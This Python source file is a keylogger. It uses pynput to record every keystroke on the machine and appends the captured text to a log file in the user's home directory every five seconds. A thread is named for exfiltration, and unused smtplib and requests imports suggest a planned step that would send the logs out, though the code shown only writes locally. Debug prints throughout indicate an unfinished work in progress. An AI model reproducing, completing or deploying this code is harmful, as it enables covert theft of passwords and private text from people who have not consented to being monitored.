import os
import threading
import smtplib
import requests
import time
from pynput.keyboard import Key, Listener

log = ""

# Function to handle key press events
def on_press(key):
    global log
    try:
        log += str(key.char)
        print(f"Key pressed: {key.char}")  # Debugging: print key pressed
    except AttributeError:
        if key == Key.space:
            log += " "
            print("Space pressed")
        elif key == Key.enter:
            log += "\n"
            print("Enter pressed")
        else:
            log += f"[{key}]"
            print(f"Special key pressed: {key}")

# Function to handle key release events (stops logging on 'esc' key)
def on_release(key):
    if key == Key.esc:
        return False

# Function to write logs to a file
def write_log():
    global log
    if log:
        print("Writing log to file...")  # Debugging line
        file_path = os.path.expanduser("~/log.txt")
        print(f"File path: {file_path}")  # Check the file path
        with open(file_path, "a") as file:  # Using 'a' to append the log
            file.write(log + "\n")
        print(f"Log written to {file_path}")
        log = ""  # Clear the log after writing

# Periodically write logs to file
def exfiltrate_logs():
    while True:
        if log:
            write_log()  # Save log locally
        time.sleep(5)  # For testing, write logs every 5 seconds

if __name__ == "__main__":
    try:
        # Start keylogging listener
        listener = Listener(on_press=on_press, on_release=on_release)
        listener_thread = threading.Thread(target=listener.start)
        listener_thread.start()

        # Start log exfiltration thread
        exfiltration_thread = threading.Thread(target=exfiltrate_logs)
        exfiltration_thread.start()

        listener_thread.join()
        exfiltration_thread.join()

    except KeyboardInterrupt:
        print("\nProgram interrupted by user. Exiting gracefully...")
